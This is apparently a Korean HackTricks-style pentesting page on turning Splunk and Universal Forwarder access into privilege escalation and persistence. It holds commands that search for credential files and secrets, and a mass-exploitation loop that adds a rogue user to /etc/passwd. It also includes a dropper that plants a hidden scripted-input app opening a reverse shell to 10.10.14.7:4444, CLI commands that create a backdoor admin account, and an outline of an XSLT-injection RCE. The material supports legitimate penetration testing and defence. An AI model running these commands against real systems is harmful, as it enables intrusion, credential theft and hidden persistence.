# Splunk LPE 및 Persistence

{{#include ../../banners/hacktricks-training.md}}

**enumerating**을 통해 머신을 **internally** 또는 **externally** 점검하던 중 **Splunk running**을 발견했다면(일반적으로 웹 UI는 **8000**, management API는 **8089**), 유효한 credentials를 app installation, scripted inputs 또는 management actions를 통해 **code execution**으로 전환할 수 있는 경우가 많습니다.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk가 **root**로 실행 중이라면 이는 곧바로 **privilege escalation**으로 이어지는 경우가 많습니다.<sup>[[1]](#references)</sup>

generic remote attack surface, enumeration 또는 app-upload RCE path만 필요한 경우 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

이미 **root**이고 Splunk service가 localhost에서만 listening 중이 아니라면, **Splunk password hashes**를 탈취하고 **encrypted secrets**를 복구하거나 **malicious app**을 배포하여 로컬 또는 여러 forwarders에 걸쳐 persistence를 유지할 수도 있습니다.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

Splunk 또는 Splunk Universal Forwarder가 실행 중인 host에 진입했다면 다음 경로가 일반적으로 가장 흥미롭습니다:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
중요한 artifact:

- **`$SPLUNK_HOME/etc/passwd`**: 로컬 Splunk 사용자와 password hash.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 여러 `.conf` 파일에 저장된 secret을 encrypt하기 위해 Splunk가 사용하는 key.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 초기 admin bootstrap 파일이며, gold image와 provisioning 실수에서 유용합니다. `etc/passwd`가 이미 존재하면 무시됩니다.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted input이 일반적으로 활성화되는 위치입니다.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** 또는 **`$SPLUNK_HOME/etc/apps/`**: persistent app을 숨기거나 이미 distribution 중인 항목을 검토하기에 좋은 위치입니다.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit 요약

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)를 확인하세요. 여기서는 요약만 제공합니다.<sup>[[1]](#references)</sup>

**Exploit 개요:**
Splunk Universal Forwarder(UF)를 대상으로 하는 exploit을 사용하면 **agent password**를 가진 attacker가 agent가 실행 중인 system에서 arbitrary code를 실행할 수 있으며, 잠재적으로 environment의 상당 부분을 compromise할 수 있습니다.<sup>[[1]](#references)</sup>

**작동하는 이유:**

- UF management service는 일반적으로 **TCP 8089**에 노출됩니다.<sup>[[6]](#references)</sup>
- Attacker는 API에 authenticate한 후 forwarder에 **malicious app bundle**을 install하도록 지시할 수 있습니다.<sup>[[1]](#references)[[5]](#references)</sup>
- 동일한 primitive를 로컬에서는 **LPE**, 원격에서는 **RCE**에 사용할 수 있습니다.<sup>[[5]](#references)</sup>
- **SplunkWhisperer2**와 같은 public tooling은 app bundle을 자동으로 생성하고 Linux target에 맞게 payload를 조정할 수 있습니다.<sup>[[5]](#references)</sup>

**Password를 복구하는 일반적인 방법:**

- Documentation, script, share 또는 deployment automation에 저장된 cleartext credential.<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd`에 있는 password hash를 확보한 후 offline cracking 수행.<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf`와 같은 golden image 또는 provisioning 잔여물.<sup>[[1]](#references)[[9]](#references)</sup>

**영향:**

- 각 compromised host에서 SYSTEM/root-level code execution.<sup>[[1]](#references)</sup>
- Persistent app, backdoor 또는 ransomware 배포.<sup>[[1]](#references)</sup>
- Data가 forward되기 전에 telemetry를 disable하거나 tamper.<sup>[[1]](#references)</sup>

**Exploit을 위한 예시 command:**

원본 report에서는 여러 forwarder에 payload를 전송하기 위해 다음 loop를 사용하는 방법을 보여줍니다.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs 또는 Malicious Apps를 통한 Persistence

`root`/`splunk`로 **filesystem write access**를 보유하거나, apps를 설치할 수 있는 authenticated access가 있다면 **scripted input**이 포함된 **custom app**을 배포하는 것이 매우 안정적인 persistence 메커니즘입니다.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk의 자체 documentation에서는 scripted inputs가 app directory 아래에 위치하고 `inputs.conf`에서 활성화될 것을 요구합니다.<sup>[[10]](#references)</sup>

일반적인 layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
최소한의 `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper (문서화된 해당 app layout 사용):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- 동일한 trick은 `/opt/splunkforwarder/etc/apps/`를 사용하는 **Universal Forwarder**에서도 작동합니다.<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers는 명백히 malicious한 app을 생성하는 대신, 정상적인 add-on을 수정하여 자신들의 활동을 숨기는 경우가 많습니다.<sup>[[2]](#references)</sup>
- **deployment server**에서 `deployment-apps/` 내부에 malicious app을 심으면 **fleet-wide persistence**로 이어집니다. forwarder가 주기적으로 확인하고, 업데이트된 app을 다운로드하며, 적용을 위해 재시작하는 경우가 많기 때문입니다.<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft and Admin Takeover

Splunk의 로컬 파일을 읽을 수 있다면, 일반적으로 두 가지 주요 목표가 있습니다. **Splunk admin access**를 복구하고 **encrypted service credentials**를 복구하는 것입니다.<sup>[[8]](#references)</sup>

### Password hashes and local users

Splunk는 로컬 authentication 데이터를 `etc/passwd`에 저장합니다. deployment에 따라 해당 파일을 cracking하면 web UI와 management API에서 사용할 수 있는 credentials를 복구할 수 있습니다.<sup>[[1]](#references)[[7]](#references)</sup>

이미 유효한 **admin** credentials를 보유하고 있고 Splunk가 **native** authentication backend를 사용한다면, CLI 자체를 persistence에 사용할 수 있습니다.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 및 암호화된 값

Splunk는 여러 구성 파일에 저장된 민감한 값을 보호하기 위해 `etc/auth/splunk.secret`을 사용합니다. **secret**과 관련된 **`.conf` 파일**을 모두 탈취할 수 있다면 다음 값을 복구하거나 재사용할 수 있는 경우가 많습니다:<sup>[[8]](#references)</sup>

- `pass4SymmKey`와 같은 forwarder/indexer shared secrets
- `sslPassword`와 같은 TLS private-key passwords
- `bindDNPassword`와 같은 LDAP bind credentials

이는 Splunk admin password 자체를 crack할 수 없는 경우에도 **lateral movement**에 활용할 수 있습니다.<sup>[[8]](#references)</sup>

### `user-seed.conf` 악용

`user-seed.conf`는 최초 시작 시 또는 `etc/passwd`가 존재하지 않을 때만 사용됩니다. 따라서 실행 중인 시스템에서는 유용성이 낮지만, 다음과 같은 환경에서는 매우 흥미롭습니다:<sup>[[9]](#references)</sup>

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk가 자동으로 reinitialize되는 appliances

이러한 경우 `splunk hash-passwd`로 생성한 `HASHED_PASSWORD`를 심어 두면 redeployment 후 admin access를 조용히 되찾을 수 있습니다.<sup>[[9]](#references)</sup>

## Splunk Queries 악용

자세한 내용은 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)를 참조하세요.<sup>[[3]](#references)[[4]](#references)</sup>

최근 유용한 technique 중 하나는 취약한 Splunk Enterprise 버전에서 **user-supplied XSLT**를 악용하여 low-privileged authenticated account를 `splunk` user 권한의 **OS command execution**으로 전환하는 것입니다.<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk에 authenticate합니다.
2. preview/upload functionality를 통해 악성 **XSL** 파일을 업로드합니다.
3. Splunk가 **dispatch** directory에 업로드된 stylesheet를 사용하여 search results를 render하도록 합니다.
4. XSLT payload를 사용하여 파일을 작성하거나 Splunk의 search pipeline을 통해 execution을 trigger합니다. 예를 들어 `runshellscript`와 같은 internal functionality에 도달합니다.

공격 관점에서 중요한 점은 이 경로가 **app upload 없이 post-auth RCE**를 가능하게 한다는 것입니다. Linux에서는 일반적으로 **`splunk`** account 권한을 획득하게 되며, 이 user는 application tree를 소유하고 secrets를 읽을 수 있으며 shell이 끊긴 후에도 유지되는 persistent apps를 심을 수 있는 경우가 많기 때문에 여전히 가치가 있습니다.<sup>[[3]](#references)[[4]](#references)</sup>

Exploitation 중 사용되는 대표적인 path는 다음과 같습니다:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk이 과도한 권한으로 실행 중이거나 `splunk` 사용자가 위험한 스크립트, 쓰기 가능한 service unit 또는 잘못된 `sudo` 규칙에 액세스할 수 있다면, 이는 깔끔한 **LPE** chain이 됩니다.

## References

- [1] [RCE 및 Persistence를 위한 Splunk Forwarder 악용](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare 주의: Persistence에 Splunk 사용하기](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 분석: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [기본값 변경](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [여러 서버에 secure password 배포](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [scripted input 설정](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [deployment app 생성](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [deployment update가 수행되는 방식](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI로 사용자 설정](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
